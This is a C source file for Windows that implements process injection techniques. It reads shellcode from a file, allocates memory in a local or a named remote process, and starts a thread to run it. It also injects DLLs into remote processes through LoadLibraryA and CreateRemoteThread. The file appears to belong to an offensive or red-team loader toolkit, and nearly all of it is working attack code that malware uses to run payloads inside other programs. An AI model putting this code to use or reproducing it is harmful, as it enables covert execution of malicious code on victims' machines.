#include <stdio.h>
#include <windows.h>

#include "Common.h"
#include "Structs.h"

BOOL LocalProcessInjection(IN DWORD dwMemoryType, IN LPCSTR lpShellcodePath)
{
	PVOID pShellcode = NULL, pShellcodeAddr = NULL;
	HANDLE hThread = NULL;
	SIZE_T sShellcodeSize = 0;
	DWORD dwThreadId;

	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
		return FALSE;

	if (!AllocateMemory(dwMemoryType, NULL, pShellcode, sShellcodeSize, &pShellcodeAddr))
		return FALSE;

	if (!RunThread(NULL, FALSE, pShellcodeAddr, &hThread, &dwThreadId))
		return FALSE;

	if (!WaitForThread(hThread))
		return FALSE;
	
	CloseHandle(hThread);
	LocalFree(pShellcode);
	FreeMemory(dwMemoryType, NULL, pShellcodeAddr);

	return TRUE;
}

BOOL RemoteProcessInjection(IN DWORD dwMemoryType, IN LPCSTR lpProcessName, IN DWORD dwEnumerationMethod, IN LPCSTR lpShellcodePath)
{
	PVOID pShellcode = NULL, pShellcodeAddr = NULL;
	HANDLE hThread = NULL, hProcess = NULL;
	SIZE_T sShellcodeSize = 0;
	DWORD dwThreadId, dwProcessId;

	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
		return FALSE;

	if (!ObtainProcessHandle(dwEnumerationMethod, lpProcessName, &hProcess, &dwProcessId))
		return FALSE;

	if (!AllocateMemory(dwMemoryType, hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
		return FALSE;

	if (!RunThread(hProcess, FALSE, pShellcodeAddr, &hThread, &dwThreadId))
		return FALSE;

	if (!WaitForThread(hThread))
		return FALSE;
	
	CloseHandle(hThread);
	LocalFree(pShellcode);
	FreeMemory(dwMemoryType, hProcess, pShellcodeAddr);

	return TRUE;
}

BOOL LocalProcessDllInjection(IN LPCSTR lpShellcodePath)
{
	LoadLibraryA(lpShellcodePath);

	return TRUE;
}

BOOL RemoteProcessDllInjection(IN DWORD dwMemoryType, IN LPCSTR lpProcessName, IN DWORD dwEnumerationMethod, IN LPCSTR lpShellcodePath)
{
	PVOID pLoadLibrary = NULL, pDllPathAddr = NULL;
	char Pwd[MAX_PATH * 2], AbsolutePath[MAX_PATH*4];
	HANDLE hThread = NULL, hProcess = NULL;
	SIZE_T sShellcodePathSize;
	DWORD dwThreadId, dwProcessId;

	if ((pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA")) == NULL)
		return ReportErrorWinAPI("GetProcAddress");
	printf("[i] Obtained pointer to LoadLibraryA : 0x%p\n", pLoadLibrary);

	if (!ObtainProcessHandle(dwEnumerationMethod, lpProcessName, &hProcess, &dwProcessId))
		return FALSE;

	// If it's relative path, prepend PWD to it
	if (!IsAbsolutePath(lpShellcodePath))
	{
		GetCurrentDirectoryA(MAX_PATH * 2, Pwd);
		sprintf_s(AbsolutePath, MAX_PATH*4, "%s\\%s", Pwd, lpShellcodePath);
		lpShellcodePath = AbsolutePath;
	}
	sShellcodePathSize = lstrlenA(lpShellcodePath);

	printf("[i] Injected %s DLL into the remote process\n", lpShellcodePath);
	if (!AllocateMemory(NULL, hProcess, lpShellcodePath, sShellcodePathSize, &pDllPathAddr))
		return FALSE;

	if ((hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibrary, pDllPathAddr, NULL, &dwThreadId)) == NULL)
		return ReportErrorWinAPI("CreateRemoteThread");
	Sleep(100);

	FreeMemory(dwMemoryType, hProcess, pDllPathAddr);
	CloseHandle(hThread);

	return TRUE;
}